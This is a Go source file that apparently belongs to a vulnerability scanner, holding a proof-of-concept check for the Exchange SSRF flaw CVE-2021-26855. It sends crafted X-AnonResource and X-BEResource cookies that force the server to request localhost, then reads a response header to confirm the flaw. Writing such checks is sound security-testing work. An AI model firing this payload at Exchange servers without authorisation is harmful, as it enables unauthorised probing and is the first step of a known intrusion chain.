package poc

import (
	"net/http"
	"strings"
	"youzai/util"
)

func (Info *PocInfo) CVE_2021_26855_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2021-26855"
	poc.Info.Target = "exchange"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "Exchange Versions < 15.00.1497.012 SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	// 生成http客户端
	cli := util.Http_Client(poc.Config.Timeout, poc.Config.Proxy, poc.Config.Proxy_Url)

	// 编写自定义检测函数，返回值有两个，第一个是判断是否存在存在漏洞，第二个参数返回响应状态码
	poc.Config.Check = func() (bool, int) {

		request, err := http.NewRequest("GET", poc.Config.Url+"/owa/auth/x.js", nil)
		if err != nil {
			return false, 0
		}
		request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1")
		request.Header.Add("Cookie", "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;")
		if response, err := cli.Do(request); err != nil {
			return false, 0
		} else {
			defer response.Body.Close()
			if strings.Contains(response.Header.Get("X-CalculatedBETarget"), "localhost") {
				return true, response.StatusCode
			}
		}
		return false, 0
	}

	PocStruct = append(PocStruct, poc)
}
